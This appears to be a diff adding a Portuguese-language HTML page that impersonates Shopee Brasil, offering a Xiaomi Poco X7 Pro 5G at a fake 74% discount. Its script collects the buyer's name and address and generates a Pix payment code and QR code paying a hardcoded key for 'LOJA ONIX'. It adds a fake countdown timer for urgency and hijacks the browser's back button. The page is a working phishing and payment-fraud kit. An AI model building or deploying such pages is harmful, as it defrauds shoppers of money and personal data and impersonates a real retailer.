@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Xiaomi Poco X7 Pro 5G | Shopee Brasil</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        :root { --shopee: #ee4d2d; --teal: #00bfa5; --bg: #f5f5f5; --shopee-blue: #002060; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html, body { background: var(--bg); font-family: -apple-system, HelveticaNeue, sans-serif; overflow-x: hidden; width: 100%; }
+
+        .top-nav { background: white; padding: 10px; display: flex; align-items: center; position: sticky; top: 0; z-index: 1000; border-bottom: 1px solid #eee; height: 50px; }
+        .search-container { flex: 1; margin: 0 12px; position: relative; }
+        .search-bar { width: 100%; border: none; background: #f0f0f0; padding: 8px 8px 8px 35px; border-radius: 2px; font-size: 14px; outline: none; }
+
+        .main-slider { display: flex; overflow-x: auto; scroll-snap-type: x mandatory; background: white; }
+        .main-slider img { width: 100vw; flex-shrink: 0; object-fit: contain; }
+
+        .flash-sale-banner { background: linear-gradient(90deg, #ff4d2d, #ff8a00); color: white; padding: 8px 15px; display: flex; align-items: center; justify-content: space-between; }
+        .timer-box { display: flex; align-items: center; gap: 4px; }
+        .timer-unit { background: #000; color: #fff; padding: 2px 4px; border-radius: 2px; font-size: 12px; font-weight: bold; min-width: 22px; text-align: center; }
+
+        .product-card { background: white; padding: 15px; margin-bottom: 8px; }
+        .price-row { color: var(--shopee); font-size: 24px; font-weight: 500; display: flex; align-items: baseline; gap: 5px; }
+        .old-price { color: #999; text-decoration: line-through; font-size: 14px; }
+        .discount-tag { background: rgba(238, 77, 45, 0.1); color: #ee4d2d; font-size: 11px; font-weight: bold; padding: 2px 4px; border-radius: 2px; }
+
+        .footer { position: fixed; bottom: 0; width: 100%; height: 50px; background: white; display: flex; border-top: 1px solid #ddd; z-index: 1000; }
+        .btn-buy { flex: 1; background: var(--shopee); color: white; border: none; font-weight: bold; font-size: 15px; cursor: pointer; }
+
+        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.7); z-index: 2000; }
+        .modal-content { position: absolute; bottom: 0; width: 100%; background: white; border-radius: 12px 12px 0 0; padding: 15px; max-height: 90vh; overflow-y: auto; }
+        .input-box { width: 100%; border: 1px solid #ddd; padding: 12px; border-radius: 4px; margin-bottom: 10px; font-size: 14px; outline: none; }
+        .opt-btn { background: #f5f5f5; border: 1px solid #f5f5f5; padding: 8px 12px; border-radius: 4px; margin: 4px; cursor: pointer; }
+        .opt-btn.selected { border-color: var(--shopee); color: var(--shopee); background: #fff5f1; }
+        
+        #qrcode-area img { max-width: 180px; margin: 10px auto; display: block; }
+    </style>
+</head>
+<body>
+
+    <div class="top-nav">
+        <i class="fas fa-arrow-left" style="color:var(--shopee);"></i>
+        <div class="search-container"><input type="text" class="search-bar" placeholder="Buscar na Shopee"></div>
+        <i class="fas fa-shopping-cart" style="color:var(--shopee);"></i>
+    </div>
+
+    <div class="main-slider">
+        <img src="https://down-br.img.susercontent.com/file/br-11134207-81z1k-meadx6k4pddue4">
+    </div>
+
+    <div class="flash-sale-banner">
+        <div><i class="fas fa-bolt"></i> OFERTA RELÂMPAGO</div>
+        <div class="timer-box">
+            <div class="timer-unit" id="h">01</div> :
+            <div class="timer-unit" id="m">30</div> :
+            <div class="timer-unit" id="s">00</div>
+        </div>
+    </div>
+
+    <div class="product-card">
+        <div class="old-price">R$2.299,00</div>
+        <div class="price-row">R$599,00 <span class="discount-tag">74% OFF</span></div>
+        <p style="margin-top:10px; font-size:15px;">Xiaomi Poco X7 PRO 5G Global Version - 256GB</p>
+    </div>
+
+    <div style="height: 60px;"></div>
+    <div class="footer">
+        <button class="btn-buy" onclick="openModal()">Compre Agora</button>
+    </div>
+
+    <div id="modal" class="modal">
+        <div class="modal-content">
+            <div id="step-1">
+                <p>Selecione a Cor:</p>
+                <button class="opt-btn" onclick="selectColor(this)">PRETO</button>
+                <button class="opt-btn" onclick="selectColor(this)">AMARELO</button>
+                <button class="btn-buy" style="width:100%; margin-top:20px; height:45px;" onclick="nextStep()">PRÓXIMO</button>
+            </div>
+
+            <div id="step-2" style="display:none;">
+                <input type="text" id="nome" class="input-box" placeholder="Nome Completo">
+                <input type="tel" id="cep" class="input-box" placeholder="CEP" onblur="buscarCEP()">
+                <input type="text" id="rua" class="input-box" placeholder="Endereço">
+                <button class="btn-buy" style="width:100%; height:45px;" onclick="gerarPixFinal()">GERAR PIX</button>
+            </div>
+
+            <div id="step-3" style="display:none; text-align:center;">
+                <p style="color:var(--teal); font-weight:bold;">PIX GERADO COM SUCESSO!</p>
+                <div id="qrcode-area"></div>
+                <div id="pix-text" style="background:#eee; padding:10px; font-size:10px; word-break:break-all; margin:10px 0;"></div>
+                <button class="btn-buy" style="width:100%; height:40px;" onclick="copyPix()">COPIAR CÓDIGO</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // --- LÓGICA DO PIX (Tradução exata do seu Python) ---
+        const CHAVE_PIX = "db0cbb53-17be-449c-89c8-9bffd8f6c7b5";
+
+        function gerarPayloadPix(chave, valor, recebedor, cidade) {
+            let payload = "00020101021226";
+            let cInfo = `0014br.gov.bcb.pix01${chave.length.toString().padStart(2, '0')}${chave}`;
+            payload += `${cInfo.length.toString().padStart(2, '0')}${cInfo}520400005303986`;
+            let vStr = valor.toFixed(2);
+            payload += `54${vStr.length.toString().padStart(2, '0')}${vStr}5802BR`;
+            payload += `59${recebedor.length.toString().padStart(2, '0')}${recebedor}`;
+            payload += `60${cidade.length.toString().padStart(2, '0')}${cidade}62070503***6304`;
+            
+            let crc = 0xFFFF;
+            for (let i = 0; i < payload.length; i++) {
+                crc ^= payload.charCodeAt(i) << 8;
+                for (let j = 0; j < 8; j++) {
+                    if (crc & 0x8000) crc = (crc << 1) ^ 0x1021;
+                    else crc <<= 1;
+                    crc &= 0xFFFF;
+                }
+            }
+            return payload + crc.toString(16).toUpperCase().padStart(4, '0');
+        }
+
+        // --- FUNÇÕES DE INTERFACE ---
+        let corSelecionada = "";
+        function openModal() { document.getElementById('modal').style.display='block'; }
+        function selectColor(btn) { 
+            document.querySelectorAll('.opt-btn').forEach(b => b.classList.remove('selected'));
+            btn.classList.add('selected');
+            corSelecionada = btn.innerText;
+        }
+        function nextStep() {
+            if(!corSelecionada) return alert("Selecione uma cor");
+            document.getElementById('step-1').style.display='none';
+            document.getElementById('step-2').style.display='block';
+        }
+
+        async function buscarCEP() {
+            let cep = document.getElementById('cep').value.replace(/\D/g, '');
+            if(cep.length === 8) {
+                let res = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
+                let d = await res.json();
+                if(!d.erro) document.getElementById('rua').value = `${d.logradouro}, ${d.bairro} - ${d.localidade}`;
+            }
+        }
+
+        function gerarPixFinal() {
+            if(!document.getElementById('nome').value) return alert("Preencha o nome");
+            const pix = gerarPayloadPix(CHAVE_PIX, 599.00, "LOJA ONIX", "SAO PAULO");
+            document.getElementById('pix-text').innerText = pix;
+            document.getElementById('qrcode-area').innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${pix}&color=ee4d2d">`;
+            document.getElementById('step-2').style.display='none';
+            document.getElementById('step-3').style.display='block';
+        }
+
+        function copyPix() {
+            navigator.clipboard.writeText(document.getElementById('pix-text').innerText);
+            alert("Código Copiado!");
+        }
+
+        // Timer e Bloqueio de Voltar
+        let seg = 5400;
+        setInterval(() => {
+            document.getElementById('h').innerText = String(Math.floor(seg/3600)).padStart(2,'0');
+            document.getElementById('m').innerText = String(Math.floor((seg%3600)/60)).padStart(2,'0');
+            document.getElementById('s').innerText = String(seg%60).padStart(2,'0');
+            if(seg > 0) seg--;
+        }, 1000);
+
+        history.pushState(null, null, location.href);
+        window.onpopstate = () => { window.location.href = "https://shopee.com.br/"; };
+    </script>
+</body>
+</html>
